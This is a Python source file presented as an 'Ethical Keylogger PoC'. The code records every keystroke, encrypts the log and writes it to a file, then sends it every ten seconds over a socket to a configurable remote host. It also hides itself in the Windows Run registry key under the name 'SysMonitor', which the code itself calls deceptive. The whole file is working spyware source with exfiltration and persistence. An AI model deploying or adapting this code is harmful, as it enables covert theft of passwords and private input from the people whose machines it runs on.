
import os
import sys
import socket
import threading
import time
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet
import base64

LOG_FILE = "keylog.txt"
KEY_FILE = "key.key"
REMOTE_HOST = "127.0.0.1" 
REMOTE_PORT = 4444
LOG_INTERVAL = 10  
KILL_SWITCH_KEY = keyboard.Key.esc


keystrokes = []
stop_keylogger = False
cipher_suite = None

def generate_or_load_key():
    global cipher_suite
    if not os.path.exists(KEY_FILE):
        print(f"[*] Generating new encryption key and saving to {KEY_FILE}")
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)
    else:
        print(f"[*] Loading encryption key from {KEY_FILE}")
        with open(KEY_FILE, "rb") as key_file:
            key = key_file.read()
    
    cipher_suite = Fernet(key)

def encrypt_data(data):
    if not isinstance(data, bytes):
        data = data.encode('utf-8')
    encrypted_data = cipher_suite.encrypt(data)
    return base64.b64encode(encrypted_data)

def on_press(key):
    global keystrokes, stop_keylogger

    if key == KILL_SWITCH_KEY:
        print("\n[!] Kill switch activated. Shutting down keylogger.")
        keystrokes.append(f"\n[KILL SWITCH PRESSED AT {datetime.now()}]\n")
        # Ensure final logs are sent before exiting
        log_and_exfiltrate()
        stop_keylogger = True
        return False  # Stop the listener

    try:
        # For alphanumeric keys
        keystrokes.append(key.char)
    except AttributeError:
        # For special keys (e.g., space, enter, shift)
        special_key = str(key).replace("Key.", "")
        keystrokes.append(f" [{special_key}] ")
        
def log_and_exfiltrate():
    global keystrokes
    if not keystrokes:
        return

    log_data = "".join(keystrokes)
    keystrokes = [] # Clear buffer immediately

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted_log = f"--- Log Entry: {timestamp} ---\n{log_data}\n"
    
    print(f"\n[*] Encrypting and preparing to send log at {timestamp}")

    # 1. Encrypt data
    encrypted_log = encrypt_data(formatted_log)

    # 2. Store logs locally (encrypted)
    try:
        with open(LOG_FILE, "ab") as f: # Append in binary mode
            f.write(encrypted_log + b"\n")
    except Exception as e:
        print(f"[!] Failed to write to local log file: {e}")

    # 3. Simulate sending to remote server
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((REMOTE_HOST, REMOTE_PORT))
            s.sendall(encrypted_log)
            print(f"[*] Log successfully sent to {REMOTE_HOST}:{REMOTE_PORT}")
    except Exception as e:
        print(f"[!] Failed to connect or send data to server: {e}")

def report_timer():
    if not stop_keylogger:
        log_and_exfiltrate()
        # Create the next timer
        threading.Timer(LOG_INTERVAL, report_timer).start()

def setup_persistence():
    if sys.platform == "win32":
        try:
            import winreg
            script_path = os.path.abspath(sys.argv[0])
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = "SysMonitor" # A deceptive name

            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            print("[*] Windows persistence set up successfully in HKCU\\...\\Run")
        except ImportError:
            print("[!] `winreg` module not found. Persistence setup skipped (not on Windows).")
        except Exception as e:
            print(f"[!] Failed to set up persistence (may require admin rights): {e}")
    else:
        print("[*] Persistence setup is platform-dependent. Not implemented for this OS.")
        print("[*] On Linux, you could use a cronjob: @reboot python3 /path/to/keylogger.py")
        print("[*] On macOS, you could use launchd.")


if __name__ == "__main__":
    print("--- Ethical Keylogger PoC ---")
    print(f"[*] Press '{str(KILL_SWITCH_KEY).split('.')[-1].upper()}' to stop the keylogger safely.")
    print(f"[*] Logs will be sent every {LOG_INTERVAL} seconds.")
    
    # 1. Setup encryption
    generate_or_load_key()

    # 2. Setup persistence (optional, can be commented out)
    setup_persistence()
    
    # 3. Start the report timer in a separate thread
    report_timer_thread = threading.Timer(LOG_INTERVAL, report_timer)
    report_timer_thread.start()

    # 4. Start the keyboard listener in the main thread (blocking call)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # Clean shutdown
    report_timer_thread.cancel()
    print("[*] Keylogger has been shut down.")
